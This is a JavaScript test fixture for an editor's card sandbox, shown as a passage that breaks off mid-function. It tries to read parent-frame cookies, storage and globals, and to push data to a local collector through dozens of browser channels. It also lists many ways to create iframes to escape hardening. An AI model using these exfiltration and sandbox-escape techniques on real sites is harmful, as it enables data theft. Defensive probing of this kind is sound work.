/**
 * Fixture for boundary probe card code (task brief `docs/plan/sound-online-render-task.md` Item 14 and
 * the "Boundary probe card" section at the end; contract `docs/plan/online-card-exec-contract.md`
 * Section 10).
 *
 * **This is a defensive test fixture, not exploit code**: used only in test environments, never added
 * to the card library, never shipped with releases; it "attempts" in its own code item by item to read
 * things it should not read, attempts to send data to the collection server, and records each item as
 * "read / rejected / what error was thrown" for the probe to retrieve and assert. Read-only,
 * report-only: does not delete, does not modify, does not consume resources, does not bypass browser
 * or system security mechanisms; passphrases, tickets, and collection server addresses used are all
 * **fake credentials and local addresses** placed in advance by the probe, with no real credentials,
 * real projects, or real external addresses used.
 *
 * This is the **probe code itself**, referenced by both boundary probe user card
 * `probe-boundary-card.tsx` and boundary probe media effect card `probe-boundary-graph.tsx`. Both execution
 * modes share this copy:
 *   - Now (before loader is connected to stage): `scripts/probes/online-card-security-probe.mjs` replaces
 *     this file's `export` with CommonJS syntax, executing in the stage frame via
 *     `new Function("require", "module", "exports", code)` (same method used by the loader to run
 *     transpilation output);
 *   - After merging with Chunk T: all three files are `content.put` into the content store as-is,
 *     executed via real transpilation and loading paths, with results read from
 *     `globalThis.__pcBoundary`.
 *
 * To support both execution modes: write only standard scripts (no type annotations, no external
 * module imports), avoiding anything caught by syntax pre-checks: the dynamic loading probe is
 * created via `new Function` (pre-checks are lexical and will not catch it; policy will block it).
 *
 * Each function returns a plain object (name → result text). **Assertions do not look at self-reporting
 * here**, but look at facts on the probe's end: whether the collection server received anything, and
 * whether read data contains secrets known to the probe. The text here is only used to identify which
 * check it is.
 */

const TIMEOUT_MS = 6000;
const text = (v) => { try { return typeof v === "string" ? v : JSON.stringify(v); } catch (e) { return String(v); } };
/**
 * Real-time timer. The stage replaces `setTimeout` with one that follows stage time
 * (`src/render/stageClock.ts`, does not advance when not playing); the real timer it uses itself is
 * kept on `__pcRealSetTimeout`: card code can obtain it just as well. `setTimeout` inside the Worker
 * was real to begin with.
 */
const later = (fn, ms) => (globalThis.__pcRealSetTimeout || setTimeout)(fn, ms);
const wait = (ms) => new Promise((r) => later(r, ms));

function runner(out, only) {
  return async (name, fn) => {
    if (only && only.indexOf(name) < 0) return;
    try { globalThis.__pcBoundaryProgress = name; } catch (e) { /* Just a progress marker */ }
    try {
      out[name] = text(await Promise.race([Promise.resolve().then(fn), new Promise((r) => later(() => r("timeout"), TIMEOUT_MS))]));
    } catch (e) {
      out[name] = "threw:" + (e && e.name) + ":" + String(e && e.message).slice(0, 120);
    }
  };
}

/* ------------------------------------------------------------------ Read: parent page object */
export async function parentReads(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  await t("parent.document", () => String(parent.document.title));
  await t("parent.location.href", () => String(parent.location.href));
  await t("parent.localStorage", () => text(Object.keys(parent.localStorage)));
  await t("parent.sessionStorage", () => text(Object.keys(parent.sessionStorage)));
  await t("parent.indexedDB", () => parent.indexedDB.databases().then((d) => text(d)));
  await t("parent.__pcStore", () => text(parent.__pcStore.getState().project));
  await t("parent.__pcPreviewDiag", () => text(parent.__pcPreviewDiag()));
  await t("parent.fetch", () => parent.fetch("/editor/runtime-config.json").then((r) => r.text()));
  await t("parent.eval", () => String(parent.eval("document.cookie")));
  await t("parent.document.cookie", () => String(parent.document.cookie));
  await t("top.document", () => String(top.document.title));
  await t("top.location.href", () => String(top.location.href));
  await t("top.localStorage", () => text(Object.keys(top.localStorage)));
  // Sibling frame: its own is readable (returns own URL), other stage origins are not readable
  for (let i = 0; i < 4; i++) await t("parent.frames[" + i + "]", () => (parent.frames[i] === window ? "self" : String(parent.frames[i].location.href) + " " + text(Object.keys(parent.frames[i].localStorage))));
  await t("opener", () => String(window.opener));
  await t("frameElement", () => String(window.frameElement));
  await t("window.length", () => String(window.length));
  await t("Object.keys(parent)", () => text(Object.keys(parent)));
  await t("Reflect.ownKeys(parent)", () => text(Reflect.ownKeys(parent).map(String)));
  await t("parent.name", () => String(parent.name));
  await t("document.referrer", () => String(document.referrer));
  await t("ancestorOrigins", () => text(Array.from(location.ancestorOrigins || [])));
  return out;
}

/* ------------------------------------------------------------------ Read: dump everything readable in the stage */
async function dumpIndexedDb(limit) {
  const parts = [];
  const dbs = await indexedDB.databases();
  for (const info of dbs) {
    parts.push("db:" + info.name);
    const db = await new Promise((res, rej) => { const r = indexedDB.open(info.name); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); r.onblocked = () => rej(new Error("blocked")); });
    try {
      for (const store of Array.from(db.objectStoreNames)) {
        parts.push("store:" + store);
        const rows = await new Promise((res, rej) => {
          const acc = [];
          const cur = db.transaction(store, "readonly").objectStore(store).openCursor();
          cur.onsuccess = () => { const c = cur.result; if (!c || acc.length >= limit) return res(acc); acc.push(text(c.key) + "=" + text(c.value).slice(0, 4000)); c.continue(); };
          cur.onerror = () => rej(cur.error);
        });
        parts.push(rows.join("\n"));
      }
    } finally { db.close(); }
  }
  return parts.join("\n");
}

async function dumpOpfs(dir, depth) {
  const parts = [];
  for await (const [name, handle] of dir.entries()) {
    parts.push("opfs:" + name);
    if (handle.kind === "file") { const f = await handle.getFile(); parts.push((await f.slice(0, 4000).text())); }
    else if (depth < 3) parts.push(await dumpOpfs(handle, depth + 1));
  }
  return parts.join("\n");
}

function dumpGlobals() {
  // Reachable strings on global object (3 levels), plus return value of each `__pc*` observation port
  const seen = new Set(), parts = [];
  // Has budget: inspect at most 200,000 values, 3 seconds; large arrays and byte chunks are not
  // traversed item by item (they contain nothing beyond string-shaped secrets, covered separately by
  // DOM and storage checks)
  const t0 = Date.now();
  let visited = 0;
  const walk = (v, depth, path) => {
    if (parts.length > 20000 || ++visited > 200000 || (visited % 2000 === 0 && Date.now() - t0 > 3000)) return;
    if (typeof v === "string") { if (v.length >= 8) parts.push(path + "=" + v.slice(0, 4000)); return; }
    if (v === null || (typeof v !== "object" && typeof v !== "function") || depth > 3 || seen.has(v)) return;
    seen.add(v);
    if (typeof Node !== "undefined" && v instanceof Node) return;
    if (ArrayBuffer.isView(v) || v instanceof ArrayBuffer) return;
    if (Array.isArray(v) && v.length > 2000) return;
    let keys = [];
    try { keys = Object.getOwnPropertyNames(v); } catch (e) { return; }
    for (const k of keys) {
      if (depth === 0 && /^(window|self|top|parent|frames|globalThis|document|location|navigator|performance|localStorage|sessionStorage|indexedDB|caches|cookieStore)$/.test(k)) continue;
      let child;
      try { child = v[k]; } catch (e) { continue; }
      walk(child, depth + 1, path + "." + k);
    }
  };
  walk(globalThis, 0, "g");
  for (const k of Object.getOwnPropertyNames(globalThis)) {
    if (!/^__pc/.test(k)) continue;
    let fn;
    try { fn = globalThis[k]; } catch (e) { continue; }
    if (typeof fn !== "function") { parts.push("hook:" + k + "=" + text(fn)); continue; }
    try { parts.push("hook:" + k + "()=" + String(text(fn())).slice(0, 200000)); } catch (e) { parts.push("hook:" + k + " threw"); }
  }
  return parts.join("\n");
}

function dumpDom() {
  const parts = [];
  for (const el of Array.from(document.querySelectorAll("*")).slice(0, 5000)) {
    for (const a of Array.from(el.attributes)) if (a.value && a.value.length >= 6) parts.push(el.localName + "@" + a.name + "=" + a.value.slice(0, 2000));
  }
  for (const s of Array.from(document.styleSheets)) { try { for (const r of Array.from(s.cssRules).slice(0, 2000)) if (/url\(/.test(r.cssText)) parts.push("css:" + r.cssText.slice(0, 500)); } catch (e) { /* Unreadable stylesheet */ } }
  return parts.join("\n");
}

/**
 * Dumps everything readable in stage script environment to text: local storage, cookies, performance
 * entries, DOM properties, global variables and observation ports, URLs and origins, and every
 * message sent by the parent page over the next `ctx.listenMs` ms (RPCs like `setMediaPolicy`).
 * The probe compares each against the secrets it knows.
 */
export async function dumpEverything(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("message unreadable"); } };
  addEventListener("message", onMessage);
  await t("location", () => location.href + " | " + document.URL + " | " + document.referrer + " | " + window.name + " | " + text(history.state));
  await t("localStorage", () => text(Object.keys(localStorage).map((k) => [k, localStorage.getItem(k)])));
  await t("sessionStorage", () => text(Object.keys(sessionStorage).map((k) => [k, sessionStorage.getItem(k)])));
  await t("indexedDB.databases", () => indexedDB.databases().then((d) => text(d.map((x) => x.name))));
  await t("indexedDB", () => dumpIndexedDb(500));
  await t("document.cookie", () => document.cookie);
  await t("cookieStore", () => cookieStore.getAll().then((all) => text(all.map((c) => c.name + "=" + c.value + ";" + c.domain + ";" + c.path))));
  await t("opfs", () => navigator.storage.getDirectory().then((d) => dumpOpfs(d, 0)));
  await t("caches", async () => { const parts = []; for (const k of await caches.keys()) { parts.push("cache:" + k); const c = await caches.open(k); for (const req of await c.keys()) { parts.push(req.url); const r = await c.match(req); if (r) parts.push((await r.text()).slice(0, 4000)); } } return parts.join("\n"); });
  await t("storage.estimate", () => navigator.storage.estimate().then(text));
  await t("performance", () => text(performance.getEntries().map((e) => e.name)));
  await t("dom", () => dumpDom());
  await t("globals", () => dumpGlobals());
  // Read asset with cookie: bytes are readable (media effect card needs this anyway), but response
  // headers must not contain tickets
  if (ctx.sid && ctx.mediaHash) {
    await t("media-headers", () => fetch("/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
    await t("grant-from-stage", () => fetch("/media-s/" + ctx.sid + "/_grant", { method: "POST", credentials: "include" }).then((r) => r.status + " " + text(Array.from(r.headers.entries()))));
  }
  await t("runtime-config", () => fetch("/editor/runtime-config.json").then((r) => r.text()).then((s) => s.slice(0, 2000)));
  await t("trace", () => new Promise((res) => { const x = new XMLHttpRequest(); try { x.open("TRACE", "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash); x.onload = () => res(x.status + " " + x.responseText.slice(0, 2000)); x.onerror = () => res("blocked"); x.send(); } catch (e) { res("threw:" + e.name); } }));
  await wait(ctx.listenMs || 0);
  removeEventListener("message", onMessage);
  out["parent-messages"] = heard.join("\n");
  return out;
}

/** Only listens to parent page messages for `ctx.listenMs` ms (RPCs like tier selection policy go through here): must not contain tickets */
export async function listenParent(ctx) {
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("message unreadable"); } };
  addEventListener("message", onMessage);
  await wait(ctx.listenMs || 0);
  removeEventListener("message", onMessage);
  return { "parent-messages": heard.join("\n") };
}

/* ------------------------------------------------------------------ Exfiltration: every way to send requests to collection server */
export async function exfilAttacks(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const E = ctx.collector, D = "http://" + ctx.dnsHost + ":" + ctx.collectorPort, tag = ctx.tag;
  const q = (name) => E + "/x?" + name + "=" + tag;
  const mount = (el) => { (document.body || document.documentElement).appendChild(el); return el; };
  await t("fetch", () => fetch(q("fetch")).then((r) => "reached:" + r.status));
  await t("fetch-no-cors", () => fetch(q("nocors"), { mode: "no-cors" }).then(() => "reached"));
  await t("fetch-keepalive", () => fetch(q("keepalive"), { mode: "no-cors", keepalive: true, method: "POST", body: "d" }).then(() => "reached"));
  await t("fetch-dns-name", () => fetch(D + "/x?dnsfetch=" + tag, { mode: "no-cors" }).then(() => "reached"));
  await t("xhr", () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res("reached"); x.onerror = () => res("blocked"); x.open("GET", q("xhr")); x.send(); }));
  await t("websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?ws=" + tag); w.onopen = () => res("reached"); w.onerror = () => res("blocked"); }));
  await t("websocketstream", () => { if (typeof WebSocketStream !== "function") return "API not available"; const w = new WebSocketStream(E.replace("http", "ws") + "/ws?wss=" + tag); return w.opened.then(() => "reached", () => "blocked"); });
  await t("beacon", () => String(navigator.sendBeacon(q("beacon"), "d")));
  await t("eventsource", () => new Promise((res) => { const s = new EventSource(q("es")); s.onopen = () => res("reached"); s.onerror = () => { s.close(); res("blocked"); }; }));
  await t("webtransport", () => { if (typeof WebTransport !== "function") return "API not available"; const w = new WebTransport("https://127.0.0.1:" + ctx.collectorPort + "/wt"); return w.ready.then(() => "reached", () => "blocked"); });
  await t("img", () => new Promise((res) => { const i = new Image(); i.onload = () => res("reached"); i.onerror = () => res("blocked"); i.src = E + "/x.png?img=" + tag; }));
  await t("img-srcset", async () => { const i = document.createElement("img"); i.srcset = E + "/x.png?srcset=" + tag + " 2x"; mount(i); await wait(300); return "inserted"; });
  await t("svg-image", async () => { const h = document.createElement("div"); h.innerHTML = "<svg width=10 height=10><image href='" + E + "/x.png?svgimage=" + tag + "' width=10 height=10 /><use href='" + E + "/x.svg?svguse=" + tag + "#a' /></svg>"; mount(h); await wait(300); return "inserted"; });
  await t("input-image", async () => { const i = document.createElement("input"); i.type = "image"; i.src = E + "/x.png?inputimage=" + tag; mount(i); await wait(300); return "inserted"; });
  await t("css-bg", async () => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + E + "/x.png?cssbg=" + tag + ")"; d.style.cursor = "url(" + E + "/x.png?csscursor=" + tag + "), auto"; d.style.width = "10px"; d.style.height = "10px"; mount(d); await wait(300); return "inserted"; });
  await t("css-import-font", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + E + "/x.css?cssimport=" + tag + "); @font-face{font-family:pcboundary;src:url(" + E + "/x.woff2?font=" + tag + ")} .pcboundary{font-family:pcboundary}"; document.head.appendChild(s); const d = document.createElement("div"); d.className = "pcboundary"; d.textContent = "x"; mount(d); await wait(400); return "inserted"; });
  await t("fontface-api", () => new FontFace("pcboundary2", "url(" + E + "/x.woff2?fontface=" + tag + ")").load().then(() => "reached", () => "blocked"));
  await t("link-css", async () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = E + "/x.css?link=" + tag; document.head.appendChild(l); await wait(300); return "inserted"; });
  await t("link-icon-manifest", async () => { for (const rel of ["icon", "manifest", "apple-touch-icon"]) { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.png?rel" + rel + "=" + tag; document.head.appendChild(l); } await wait(400); return "inserted"; });
  await t("script-src", () => new Promise((res) => { const s = document.createElement("script"); s.onload = () => res("reached"); s.onerror = () => res("blocked"); s.src = E + "/x.js?script=" + tag; document.head.appendChild(s); }));
  await t("script-module", () => new Promise((res) => { const s = document.createElement("script"); s.type = "module"; s.onload = () => res("reached"); s.onerror = () => res("blocked"); s.src = E + "/x.js?module=" + tag; document.head.appendChild(s); }));
  await t("dynamic-import", () => new Function("u", "return imp" + "ort(u)")(E + "/x.js?dynimport=" + tag).then(() => "reached"));
  await t("iframe", async () => { const f = document.createElement("iframe"); f.src = q("iframe"); mount(f); await wait(500); return "inserted"; });
  await t("iframe-html", async () => { const h = document.createElement("div"); h.innerHTML = "<iframe src='" + q("iframehtml") + "'></iframe>"; mount(h); await wait(500); return "inserted"; });
  await t("iframe-srcdoc", async () => { const f = document.createElement("iframe"); f.srcdoc = "<img src='" + E + "/x.png?srcdoc=" + tag + "'>"; mount(f); await wait(500); return "inserted"; });
  await t("object", async () => { const o = document.createElement("object"); o.data = q("object"); mount(o); await wait(300); return "inserted"; });
  await t("embed", async () => { const o = document.createElement("embed"); o.src = q("embed"); mount(o); await wait(300); return "inserted"; });
  await t("video", () => new Promise((res) => { const v = document.createElement("video"); v.onerror = () => res("blocked"); v.onloadeddata = () => res("reached"); v.src = E + "/x.webm?video=" + tag; later(() => res("no result"), 1200); }));
  await t("audio-track", async () => { const a = document.createElement("audio"); a.src = E + "/x.mp3?audio=" + tag; const v = document.createElement("video"); const tr = document.createElement("track"); tr.src = E + "/x.vtt?track=" + tag; tr.default = true; v.appendChild(tr); v.poster = E + "/x.png?poster=" + tag; mount(a); mount(v); await wait(500); return "inserted"; });
  // Form submission (current frame, new window) and links with download navigate the stage itself away
  // (frame lands on error page after interception); categorized under navigation to run separately
  // (form-self, form-blank, a-download of navAttack)
  await t("a-ping", async () => { const a = document.createElement("a"); a.href = "#"; a.ping = q("ping"); mount(a); a.click(); await wait(300); return "clicked"; });
  for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload", "prerender"]) {
    await t("hint-" + rel, async () => { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.js?" + rel + "=" + tag; if (rel === "preload") l.as = "script"; document.head.appendChild(l); await wait(500); return "inserted"; });
  }
  await t("hint-dns-name", async () => { for (const rel of ["dns-prefetch", "preconnect"]) { const l = document.createElement("link"); l.rel = rel; l.href = "http://" + ctx.dnsHost + "/"; document.head.appendChild(l); } await wait(800); return "inserted"; });
  await t("speculation-rules", async () => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [q("specrules")] }] }); document.head.appendChild(s); await wait(500); return "inserted"; });
  await t("worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?worker=" + tag); w.onerror = () => res("blocked"); later(() => res("created"), 500); } catch (e) { res("threw:" + e.name); } }));
  await t("worker-same-origin-url", () => new Promise((res) => { try { const src = Array.from(document.scripts).map((s) => s.src).find(Boolean); const w = new Worker(src); w.onmessage = () => res("running"); w.onerror = () => res("blocked"); later(() => res("no result"), 800); } catch (e) { res("threw:" + e.name); } }));
  await t("sharedworker", () => new Promise((res) => { try { const w = new SharedWorker(E + "/x.js?shared=" + tag); w.onerror = () => res("blocked"); later(() => res("created"), 500); } catch (e) { res("threw:" + e.name); } }));
  await t("service-worker", () => navigator.serviceWorker.register(Array.from(document.scripts).map((s) => s.src).find(Boolean)).then(() => "registered"));
  await t("audio-worklet", async () => { const C = window.OfflineAudioContext; const c = new C(1, 128, 44100); return c.audioWorklet.addModule(E + "/x.js?worklet=" + tag).then(() => "reached", () => "blocked"); });
  await t("paint-worklet", () => (CSS.paintWorklet ? CSS.paintWorklet.addModule(E + "/x.js?paint=" + tag).then(() => "reached", () => "blocked") : "API not available"));
  await t("blob-worker-fetch", () => new Promise((res) => { const w = new Worker(URL.createObjectURL(new Blob(["fetch(" + JSON.stringify(q("blobworker")) + ",{mode:'no-cors'}).then(()=>postMessage('reached'),()=>postMessage('blocked'))"], { type: "text/javascript" }))); w.onmessage = (e) => res(e.data); w.onerror = () => res("Worker error"); }));
  await t("window.open", () => { const w = window.open(q("open")); return w ? "opened" : "not opened"; });
  await t("webrtc", () => webrtcAttack(ctx, globalThis.RTCPeerConnection || globalThis.webkitRTCPeerConnection));
  return out;
}

/** WebRTC: sends STUN (UDP) and TURN (TCP) to collection server. `Ctor` is obtainable constructor (undefined in this document after hardening) */
export function webrtcAttack(ctx, Ctor) {
  return new Promise((res) => {
    if (typeof Ctor !== "function") return res("no constructor");
    let pc;
    try {
      pc = new Ctor({ iceServers: [{ urls: "stun:127.0.0.1:" + ctx.collectorPort }, { urls: "turn:127.0.0.1:" + ctx.collectorPort + "?transport=tcp", username: "exfil-" + ctx.tag, credential: "x" }] });
    } catch (e) { return res("threw:" + e.name); }
    const got = [];
    pc.onicecandidate = (e) => { if (e.candidate) got.push(e.candidate.type); else res("candidates:" + JSON.stringify(got)); };
    pc.createDataChannel("x");
    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => res("threw:" + e.name));
    later(() => res("candidates (at timeout):" + JSON.stringify(got)), 3000);
  });
}

/* ------------------------------------------------------------------ Hardening: every path to retrieve RTCPeerConnection from child frames */
export async function hardenAttacks(ctx) {
  const out = {};
  const host = document.createElement("div");
  (document.body || document.documentElement).appendChild(host);
  const XHTML = "http://www.w3.org/1999/xhtml";
  /** Whether child frames exist in stage right now and whether constructor is obtainable inside (only checks if obtainable, does not use it) */
  const grab = () => {
    for (let i = 0; i < window.length; i++) { try { if (typeof window[i].RTCPeerConnection === "function") return "obtained"; } catch (e) { /* Cannot read */ } }
    return "not obtained (" + window.length + " child frames)";
  };
  const clean = () => { for (const f of Array.from(document.querySelectorAll("iframe,object,embed,frame,frameset,portal,fencedframe"))) f.remove(); host.textContent = ""; };
  const t = (name, fn) => {
    if (ctx.only && ctx.only.indexOf(name) < 0) return;
    try { fn(); out[name] = grab(); } catch (e) { out[name] = "threw:" + (e && e.name) + ";" + grab(); }
    clean();
  };
  const asyncT = async (name, fn) => {
    if (ctx.only && ctx.only.indexOf(name) < 0) return;
    try { await Promise.race([fn(), wait(4000)]); out[name] = grab(); } catch (e) { out[name] = "threw:" + (e && e.name) + ";" + grab(); }
    clean();
  };
  out["own"] = typeof window.RTCPeerConnection + "/" + typeof window.webkitRTCPeerConnection;
  // 21 items tested by feasibility probe (kept for regression)
  t("createElement", () => host.appendChild(document.createElement("iframe")));
  t("createElement-uppercase", () => host.appendChild(document.createElement("IFRAME")));
  t("createElementNS", () => host.appendChild(document.createElementNS(XHTML, "iframe")));
  t("innerHTML", () => { host.innerHTML = "<iframe></iframe>"; });
  t("insertAdjacentHTML", () => host.insertAdjacentHTML("beforeend", "<iframe></iframe>"));
  t("outerHTML", () => { const d = document.createElement("div"); host.appendChild(d); d.outerHTML = "<iframe></iframe>"; });
  t("DOMParser+adopt", () => { const d = new DOMParser().parseFromString("<iframe></iframe>", "text/html"); host.appendChild(document.adoptNode(d.querySelector("iframe"))); });
  t("createContextualFragment", () => host.appendChild(document.createRange().createContextualFragment("<iframe></iframe>")));
  t("template", () => { const tp = document.createElement("template"); tp.innerHTML = "<iframe></iframe>"; host.appendChild(tp.content); });
  t("setHTMLUnsafe", () => host.setHTMLUnsafe("<iframe></iframe>"));
  t("setHTML(Sanitizer)", () => host.setHTML("<iframe></iframe>"));
  t("createElement from another document", () => { const d = document.implementation.createHTMLDocument(""); host.appendChild(d.createElement("iframe")); });
  t("createElementNS of an XML document", () => { const d = document.implementation.createDocument(XHTML, "html", null); host.appendChild(d.createElementNS(XHTML, "iframe")); });
  t("customized built-in element", () => { class X extends HTMLIFrameElement {} customElements.define("x-pcboundary-f", X, { extends: "iframe" }); host.appendChild(new X()); });
  t("XSLT", () => { const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;,&quot;ame&quot;)}" namespace="' + XHTML + '"/></xsl:template></xsl:stylesheet>', "application/xml"); const pr = new XSLTProcessor(); pr.importStylesheet(xsl); host.appendChild(pr.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document)); });
  t("object", () => { const o = document.createElement("object"); o.data = "about:blank"; host.appendChild(o); });
  t("svg-foreignObject", () => { host.innerHTML = "<svg><foreignObject><iframe xmlns='" + XHTML + "'></iframe></foreignObject></svg>"; });
  t("importNode (from a retrieved same-origin document)", () => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl, false); x.send(); const d = new DOMParser().parseFromString(x.responseText.indexOf("<iframe") >= 0 ? x.responseText : "<iframe></iframe>", "text/html"); host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
  await asyncT("XHR responseType=document", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl); try { x.responseType = "document"; } catch (e) { return rej(e); } x.onload = () => { try { const d = x.response || x.responseXML; const el = d.querySelector("iframe") || d.createElement("iframe"); host.appendChild(document.importNode(el, true)); res(); } catch (e) { rej(e); } }; x.onerror = () => rej(new Error("unavailable")); x.send(); }));
  t("execCommand", () => { host.contentEditable = "true"; host.focus(); document.execCommand("insertHTML", false, "<iframe></iframe>"); });
  t("window.open", () => { const w = window.open("about:blank"); if (w && typeof w.RTCPeerConnection === "function") throw new Error("OPENED"); });
  // Added during implementation
  t("XHR responseXML (synchronous)", () => { const x = new XMLHttpRequest(); x.open("GET", ctx.frameDocUrl, false); x.overrideMimeType("application/xhtml+xml"); x.send(); const d = x.responseXML; host.appendChild(document.importNode(d.querySelector("iframe"), true)); });
  t("XML entity expansion", () => { const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY f "&#60;iframe xmlns=\'' + XHTML + '\'/&#62;">]><r xmlns="' + XHTML + '">&f;</r>', "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
  t("DOMParser XML + importNode", () => { const d = new DOMParser().parseFromString("<if" + "rame xmlns='" + XHTML + "'/>", "application/xhtml+xml"); host.appendChild(document.importNode(d.documentElement, true)); });
  t("cloneNode (another document)", () => { const d = document.implementation.createHTMLDocument(""); const f = d.createElement("iframe"); host.appendChild(f.cloneNode(true)); });
  t("Range.insertNode", () => { const d = document.implementation.createHTMLDocument(""); const r = document.createRange(); r.selectNodeContents(host); r.insertNode(document.adoptNode(d.createElement("iframe"))); });
  t("insertAdjacentElement", () => { const d = document.implementation.createHTMLDocument(""); host.insertAdjacentElement("beforeend", document.adoptNode(d.createElement("iframe"))); });
  t("append / prepend / replaceChildren", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); try { host.append(mk()); } catch (e) { /* Next */ } try { host.prepend(mk()); } catch (e) { /* Next */ } host.replaceChildren(mk()); });
  t("before / after / replaceWith", () => { const d = document.implementation.createHTMLDocument(""); const mk = () => document.adoptNode(d.createElement("iframe")); const a = document.createElement("span"); host.appendChild(a); try { a.before(mk()); } catch (e) { /* Next */ } try { a.after(mk()); } catch (e) { /* Next */ } a.replaceWith(mk()); });
  t("after on a text node", () => { const d = document.implementation.createHTMLDocument(""); const tx = document.createTextNode("x"); host.appendChild(tx); tx.after(document.adoptNode(d.createElement("iframe"))); });
  t("replaceChild", () => { const d = document.implementation.createHTMLDocument(""); const a = document.createElement("span"); host.appendChild(a); host.replaceChild(document.adoptNode(d.createElement("iframe")), a); });
  t("carried inside a fragment (appendChild of a fragment)", () => { const d = document.implementation.createHTMLDocument(""); const fr = document.createDocumentFragment(); const wrap = document.createElement("div"); fr.appendChild(wrap); Node.prototype.appendChild.call(wrap, document.adoptNode(d.createElement("iframe"))); host.appendChild(fr); });
  t("insert an empty shell first, then rename (setAttribute is)", () => { const el = document.createElement("div", { is: "iframe" }); host.appendChild(el); });
  t("embed", () => host.appendChild(document.createElement("embed")));
  t("frameset", () => { const fs = document.createElement("frameset"); fs.appendChild(document.createElement("frame")); document.documentElement.appendChild(fs); });
  t("template.content.cloneNode", () => { const d = document.implementation.createHTMLDocument(""); d.body.innerHTML = "<template><iframe></iframe></template>"; host.appendChild(document.importNode(d.querySelector("template").content, true)); });
  t("Document.parseHTMLUnsafe", () => { const d = Document.parseHTMLUnsafe("<iframe></iframe>"); host.appendChild(document.adoptNode(d.querySelector("iframe"))); });
  t("document.write", () => { document.write("<iframe></iframe>"); });
  t("shadow root innerHTML", () => { const s = host.attachShadow({ mode: "open" }); s.innerHTML = "<iframe></iframe>"; });
  t("shadow root setHTMLUnsafe", () => { const d = document.createElement("div"); host.appendChild(d); const s = d.attachShadow({ mode: "open" }); s.setHTMLUnsafe("<iframe></iframe>"); });
  t("declarative shadow DOM", () => { host.setHTMLUnsafe("<div><template shadowrootmode='open'><iframe></iframe></template></div>"); });
  t("createElement after the prototype is overwritten", () => { const keep = String.prototype.toLowerCase; String.prototype.toLowerCase = function () { return "div"; }; try { host.appendChild(document.createElement("iframe")); } finally { String.prototype.toLowerCase = keep; } });
  t("Reflect.apply overwritten", () => { const keep = Reflect.apply; Reflect.apply = function (f, th, args) { return keep(f, th, args); }; try { host.appendChild(document.createElement("iframe")); } finally { Reflect.apply = keep; } });
  t("iframe in the MathML / SVG namespace", () => { host.appendChild(document.createElementNS("http://www.w3.org/2000/svg", "iframe")); });
  t("Constructor inside a Worker", () => { /* Worker does not have RTCPeerConnection to begin with: asserted by workerAttempts */ });
  // Fallback timing: retrieve immediately after insertion in same tick (grab in each item above is in
  // the same tick); wait another tick to see if any remain
  await wait(300);
  out["Child frame count at the end"] = String(window.length);
  host.remove();
  return out;
}

/**
 * Second layer of hardening (insertion entry points) and fallback: assuming the "disallow creating
 * child frame elements" layer is bypassed: `make` is a function left by the probe before page scripts
 * that "creates iframe with genuine createElement" (`globalThis.__pcMakeFrame`). With element in hand,
 * try each insertion entry point one by one to see whether a child frame actually appears in stage.
 */
export async function insertAttacks(ctx) {
  const out = {};
  const make = globalThis.__pcMakeFrame;
  if (typeof make !== "function") return { "No original constructor kept": "skipped" };
  const host = document.createElement("div");
  (document.body || document.documentElement).appendChild(host);
  const t = (name, fn) => {
    let said = "";
    try { fn(); said = "inserted"; } catch (e) { said = "threw:" + (e && e.name); }
    // Checked in the same tick: if insertion points did not block it, a child frame exists here
    // (the fallback observer does not remove it until the next tick)
    out[name] = said + "; in the same tick, " + window.length + " child frames";
    for (const f of Array.from(document.querySelectorAll("iframe"))) f.remove();
    host.textContent = "";
  };
  const wrap = () => { const d = document.createElement("div"); Node.prototype.appendChild.call(d, make()); return d; };
  t("appendChild", () => host.appendChild(make()));
  t("appendChild(wrapped in a div)", () => host.appendChild(wrap()));
  t("insertBefore", () => host.insertBefore(make(), null));
  t("replaceChild", () => { const a = document.createElement("span"); host.appendChild(a); host.replaceChild(make(), a); });
  t("append", () => host.append(make()));
  t("append(text plus element)", () => host.append("x", wrap()));
  t("prepend", () => host.prepend(make()));
  t("replaceChildren", () => host.replaceChildren(make()));
  t("before", () => { const a = document.createElement("span"); host.appendChild(a); a.before(make()); });
  t("after", () => { const a = document.createElement("span"); host.appendChild(a); a.after(make()); });
  t("replaceWith", () => { const a = document.createElement("span"); host.appendChild(a); a.replaceWith(make()); });
  t("before on a text node", () => { const tx = document.createTextNode("x"); host.appendChild(tx); tx.before(make()); });
  t("replaceWith on a text node", () => { const tx = document.createTextNode("x"); host.appendChild(tx); tx.replaceWith(wrap()); });
  t("insertAdjacentElement", () => host.insertAdjacentElement("beforeend", make()));
  t("Range.insertNode", () => { const r = document.createRange(); r.selectNodeContents(host); r.insertNode(make()); });
